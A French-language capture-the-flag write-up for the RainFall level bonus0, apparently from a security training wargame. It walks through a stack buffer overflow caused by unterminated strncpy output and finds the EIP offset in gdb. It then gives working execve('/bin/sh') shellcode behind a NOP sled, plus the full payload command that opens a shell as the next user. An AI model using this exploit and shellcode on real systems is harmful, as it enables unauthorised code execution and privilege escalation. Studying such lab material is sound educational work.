# Soluce

Payload : 
```
(python -c 'print("A" * 4095 + "\n" + "A" * 9 + "\x1d\xf3\xff\xbf" + "A" * 7)') > payload; cat payload - | ./bonus0
```

## Description du code

En observant le code source nous pouvont constater que 2 fonction son presente :

La Fonction pp :

- Elle prend en argument une string de destination
- Elle declare 2 string d'environ une taille de 20 octet, S1 et S2
- Elle appel deux fois la fonction p en lui passant toujour un - et a la suite les 2 string declarer precedement
- Puis elle copie S1 dans la string de destination  grace a strcpy
- Elle ajoute un espace a la fin de destination
- Et enfin elle concatene la string de destination avec S2 grace a strcat

La fonction p :

- Elle prend 2 argument une string de destination et une string qui servira de prompt
- Elle declare un buffer d'une taille de 4104 octet
- Elle affiche sur l'entree standard la string qui stock le prompt
- Elle lis sur l'entree standard 4096 charactere maximul et stock le tout dans le buffer 
- Elle cherche un \n dans le buffer et le remplace par un \0 grace a strchr
- Et enfin elle copie les 20 premiere characteres dans dest grace a strncpy

## Explication de L'exploit

Maintenant on peu constater plusieur chose dans ce code, deja si les string qui sont entree dans p depasse les 20 charactere elle sont copier sans \0 donc quand strcpy et strcat sont appeler cela de overwritte des registre dans la stack et pottentiellement de segfault, testons :

```
bonus0@RainFall:~$ gdb ./bonus0 
(gdb) b main
Breakpoint 1 at 0x80485a7
(gdb) run
Starting program: /home/user/bonus0/bonus0 

Breakpoint 1, 0x080485a7 in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7A
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7A
Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���
0x41336141 in ?? ()
```

On peu constater plusieur chose, deja cela segfault apres avoir puts, on peu voir que pour s1 equivaut a s1 + s2 donc cela overwrite bien, maintenant voyons voir l'etat des registre en utilisant 2 string differente pour deviner ou est notre offset :

```
(...)
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7A
 - 
Da0Da1Da2Da3Da4Da5Da6Da7D
Aa0Aa1Aa2Aa3Aa4Aa5AaDa0Da1Da2Da3Da4Da5Da��� Da0Da1Da2Da3Da4Da5Da���
0x44336144 in ?? ()
(gdb) info r
eax            0x0      0
ecx            0xffffffff       -1
edx            0xb7fd28b8       -1208145736
ebx            0xb7fd0ff4       -1208152076
esp            0xbfffef50       0xbfffef50
ebp            0x32614431       0x32614431
esi            0x0      0
edi            0x0      0
eip            0x44336144       0x44336144
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33   
```

44336144 -> D3aD -> Da3D -> 9 in Da0Da1Da2Da3Da4Da5Da6Da7D

On peu voir que EIP est overwritte a l'offset 9 de S2, on peu en deduire que l'on on a seulment 11 octet pour notre placer du code arbitraire car l'on a seulement 20 octet qui seront copier dans s1 et 9 octet setont utiliser pour du padding, donc ret to libc est impossible car il coute 12 octet, un shellcode est possible mais seulement si il utilise que 11 octet le plus simple reste de passer par un shellcode stocker dans notre variable d'environnement.

```
export SHELLCODE=$(python -c 'print("\x90" * 2000 + "1\xc0\xb0\xbe\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80")')
```

Recuperont l'adresse de notre shellcode dans le program :

```
(...)
Breakpoint 1, 0x080485a7 in main ()
(gdb) call (char *) getenv("SHELLCODE")
$1 = 0xbffff129 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"(...)
```

On a mis 2000 de nop sled pour etre plus precis dans notre payload, on va ajouter a notre adresse du shellcode 500 ce qui va faire :

bffff129 + 500 = bffff31d

Maintenant pour faire executer notre payload, il faudra passer par un fichier cependant 2 entree son attendu et il ne sera pas possible de juste faire un \n dans notre fichier car, il ne stoppera pas le premier read, ce qu'on va faire c'est que l'on va ecrire sur l'entree standard 4095 caractere + un \n pour ne pas segfault dans le strchr, ce qui va avoir pour effet de stopper le premier read, ensuite on mettra notre padding de 9 l'adresse de au milieu de notre nop sled et enfin les 7 caractere supplementaire pour faire segfault puts, ce qui aura pour effet d'acceder a notre shellcode et l'executer.


## Payload
```
[Padding de 4095] + ["\n" Pour ne pas segfault lors de strchr] + [Padding de 9] + [Adrresse dans le nop sled] + [Padding pour segfault]
```
```
bonus0@RainFall:~$ (python -c 'print("A" * 4095 + "\n" + "A" * 9 + "\x1d\xf3\xff\xbf" + "A" * 7)') > payload; cat payload - | ./bonus0
 - 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAA��� AAAAAAAAA���AAAAAAA���
whoami
bonus1
```